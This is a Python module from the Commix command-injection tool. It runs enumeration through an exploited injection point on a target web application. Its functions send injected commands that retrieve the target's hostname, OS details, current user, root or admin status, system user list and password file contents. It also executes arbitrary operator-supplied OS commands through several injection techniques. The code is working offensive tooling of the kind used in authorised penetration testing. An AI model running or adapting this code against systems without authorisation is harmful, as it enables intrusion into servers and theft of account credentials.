#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
from src.utils import logs
from src.utils import menu
from src.utils import common
from src.utils import settings
from src.utils import session_handler
from src.core.requests import requests
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Powershell's version number enumeration (for Windows OS)
"""
def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
  _ = False
  cmd = settings.PS_VERSION
  if not settings.TIME_RELATED_ATTACK and alter_shell:
    cmd = checks.escape_single_quoted_cmd(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
      ps_version = shell
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
      # Evaluate injection results.
      ps_version = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      ps_version = "".join(str(p) for p in ps_version)
    session_handler.store_cmd(url, cmd, ps_version, vuln_parameter)
  else:
    ps_version = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_ps_version(ps_version, filename, _)

"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  _ = False
  if settings.TARGET_OS == settings.OS.WINDOWS:
    settings.HOSTNAME = settings.WIN_HOSTNAME
  cmd = settings.HOSTNAME
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
          response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
        else:
          # Command execution results.
          response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
          # Perform target page reload (if it is required).
          if settings.URL_RELOAD:
            response = requests.url_reload(url, timesec)
          # Evaluate injection results.
      shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      shell = "".join(str(p) for p in shell)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_hostname(shell, filename, _)

"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  _ = False
  if settings.TARGET_OS == settings.OS.WINDOWS:
    settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
  cmd = settings.RECOGNISE_OS
  if not settings.TIME_RELATED_ATTACK and settings.TARGET_OS == settings.OS.WINDOWS and alter_shell:
    cmd = "cmd /c " + cmd
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, target_os = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, target_os = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
      # Evaluate injection results.
      target_os = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      target_os = "".join(str(p) for p in target_os)
    session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
  else:
    target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  if settings.TIME_RELATED_ATTACK and settings.VERBOSITY_LEVEL == 0 and _:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  if target_os:
    if not settings.TIME_RELATED_ATTACK:
      target_os = "".join(str(p) for p in target_os)
    if settings.TARGET_OS != settings.OS.WINDOWS:
      cmd = settings.DISTRO_INFO
      if not settings.TIME_RELATED_ATTACK:
        if settings.USE_BACKTICKS:
          cmd = checks.remove_command_substitution(cmd)
      if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        # Command execution results.
        if settings.TIME_RELATED_ATTACK:
          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
            check_exec_time, distro_name = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
          else:
            check_exec_time, distro_name = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
        else:
          if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
            response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
          else:
            # Command execution results.
            response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
            # Perform target page reload (if it is required).
            if settings.URL_RELOAD:
              response = requests.url_reload(url, timesec)
          # Evaluate injection results.
          distro_name = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
          distro_name = "".join(str(p) for p in distro_name)
        if len(distro_name) != 0:
          target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
        session_handler.store_cmd(url, cmd, target_os, vuln_parameter)
      else:
        target_os = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = settings.WIN_RECOGNISE_HP
    else:
      cmd = settings.RECOGNISE_HP
    if settings.TIME_RELATED_ATTACK and settings.VERBOSITY_LEVEL == 0 and _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
      # Command execution results.
      if settings.TIME_RELATED_ATTACK:
        _ = True
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          check_exec_time, target_arch = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
        else:
          check_exec_time, target_arch = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
      else:
        if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
          response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
        else:
          # Command execution results.
          response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
          # Perform target page reload (if it is required).
          if settings.URL_RELOAD:
            response = requests.url_reload(url, timesec)
        # Evaluate injection results.
        target_arch = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
        target_arch = "".join(str(p) for p in target_arch)
      session_handler.store_cmd(url, cmd, target_arch, vuln_parameter)
    else:
      target_arch = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  else:
    target_arch = None
  checks.print_os_info(target_os, target_arch, filename, _)

"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  _ = False
  if settings.TARGET_OS == settings.OS.WINDOWS:
    settings.CURRENT_USER = settings.WIN_CURRENT_USER
  cmd = settings.CURRENT_USER
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, cu_account = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, cu_account = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
        # Evaluate injection results.
      cu_account = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      cu_account = "".join(str(p) for p in cu_account)
    session_handler.store_cmd(url, cmd, cu_account, vuln_parameter)
  else:
    cu_account = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_current_user(cu_account, filename, _)

"""
Check if the Current user is privileged.
"""
def check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  _ = False
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.IS_ADMIN
  else:
    cmd = settings.IS_ROOT
    if settings.USE_BACKTICKS:
      cmd = checks.remove_command_substitution(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
      # Evaluate injection results.
      shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      shell = "".join(str(p) for p in shell).replace(settings.SINGLE_WHITESPACE, "", 1)[:-1]
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_current_user_privs(shell, filename, _)

"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  cmd = settings.SYS_USERS
  _ = False
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_SYS_USERS
    if settings.TIME_RELATED_ATTACK:
      cmd = cmd + settings.WIN_REPLACE_WHITESPACE
    if alter_shell:
      cmd = checks.escape_single_quoted_cmd(cmd)
    if not settings.TIME_RELATED_ATTACK:
      cmd = checks.add_new_cmd(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      try:
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          check_exec_time, sys_users = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
        else:
          check_exec_time, sys_users = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
      except TypeError:
        sys_users = ""
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
      # Evaluate injection results.
      sys_users = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      sys_users = "".join(str(p) for p in sys_users)
    session_handler.store_cmd(url, cmd, sys_users, vuln_parameter)
  else:
    sys_users = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell)

"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  _ = False
  cmd = settings.SYS_PASSES
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, sys_passes = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, sys_passes = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
      if sys_passes == False:
        sys_passes = ""
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
        # Evaluate injection results.
      sys_passes = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      sys_passes = "".join(str(p) for p in sys_passes)
    session_handler.store_cmd(url, cmd, sys_passes, vuln_parameter)
  else:
    sys_passes = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_passes(sys_passes, filename, _, alter_shell)

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector

  cmd =  menu.options.os_cmd
  checks.print_enumenation().print_single_os_cmd_msg(cmd)
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    # Command execution results.
    if settings.TIME_RELATED_ATTACK:
      _ = True
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        # Command execution results.
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        # Perform target page reload (if it is required).
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
        # Evaluate injection results.
      shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      shell = "".join(str(p) for p in shell)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    if settings.TIME_RELATED_ATTACK and settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.print_single_os_cmd(cmd, shell, filename)

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  # Check if PowerShell is enabled.
  if not menu.options.ps_version and settings.TARGET_OS == settings.OS.WINDOWS:
    checks.ps_check()

  if menu.options.ps_version and settings.PS_ENABLED == None:
    if not checks.ps_incompatible_os():
      checks.print_enumenation().ps_version_msg()
      powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
      settings.ENUMERATION_DONE = True

  if menu.options.hostname:
    checks.print_enumenation().hostname_msg()
    hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.current_user:
    checks.print_enumenation().current_user_msg()
    current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.is_root or menu.options.is_admin:
    checks.print_enumenation().check_privs_msg()
    check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    checks.print_enumenation().os_info_msg()
    system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    checks.print_enumenation().print_users_msg()
    system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      check_option = "--passwords"
      checks.unavailable_option(check_option)
    else:
      checks.print_enumenation().print_passes_msg()
      system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

"""
Check stored session
"""
def stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  # Check for any enumeration options.
  new_line = True
  if settings.ENUMERATION_DONE == True :
    while True:
      message = "Do you want to ignore stored session and enumerate again? [y/N] > "
      enumerate_again = common.read_input(message, default="N", check_batch=True)
      if enumerate_again in settings.CHOICE_YES:
        if not menu.options.ignore_session:
          menu.options.ignore_session = True
        do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
        break
      elif enumerate_again in settings.CHOICE_NO:
        new_line = False
        break
      elif enumerate_again in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(enumerate_again)
        pass
  else:
    if menu.enumeration_options():
      do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)

# eof